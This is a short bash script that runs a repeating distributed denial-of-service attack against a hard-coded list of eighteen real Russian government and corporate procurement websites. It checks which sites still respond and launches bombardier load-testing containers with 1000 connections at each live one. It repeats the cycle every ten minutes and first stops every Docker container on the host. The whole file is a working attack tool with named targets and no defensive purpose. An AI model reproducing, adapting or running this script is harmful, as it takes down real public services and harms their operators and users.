#!/bin/bash

# FILE #5 GOSZAKUPKI

# Configuration of Bombardier
BOMBARDIER_TIMEOUT=10m #this is the time of bombardement
BOMBARDIER_CONNECTIONS=1000

declare -a sites=(
"https://zakupki.gov.ru/"
"https://www.roseltorg.ru/"
"https://lot-online.ru/"
"https://gos.etpgpb.ru/"
"https://www.etp-ets.ru/"
"https://etpgpb.ru/"
"https://www.tektorg.ru/"
"https://www.rts-tender.ru/"
"https://www.zakupki.ru/"
"https://zakupki.mos.ru/"
"https://www.fabrikant.ru/"
"https://eshoprzd.ru/"
"https://estp.ru/"
"https://zakupki.gazprom-neft.ru/"
"https://www.zakazrf.ru/"
"https://etpgaz.gazprombank.ru/"
"https://zakupki.rosneft.ru/"
"http://www.mirconnect.ru/"
)

while :
do
  echo "Stop all containers"
  docker stop $(docker ps -aq)
  echo "Docker containers stopped"

  echo "Run ddos for all sites"
  for site in "${sites[@]}"; do
  
    status_code=$(curl -m 2 -s -o /dev/null  -w "%{http_code}" "$site")
    status_code=$(expr "$status_code" + 0)
    # If status code is zero site is already blocked
  
    site_status="${site} status code ${status_code}"
    echo "$site_status"
  
    if (("$status_code" != 0 && "$status_code" <= 400)); then
      echo "Must be destroyed"
      docker run -ti -d --rm alpine/bombardier -c "$BOMBARDIER_CONNECTIONS" -d "$BOMBARDIER_TIMEOUT" -l "$site"
    fi
  
  done

  echo "DDoS is up and running..."

  #these are SECONDS!!!! and they must correspond to BOMBARDIER_TIMEOUT above...in this case it's 10minutes
  sleep 600

  echo "Restarting DDoS, checking which sites are still working"
done
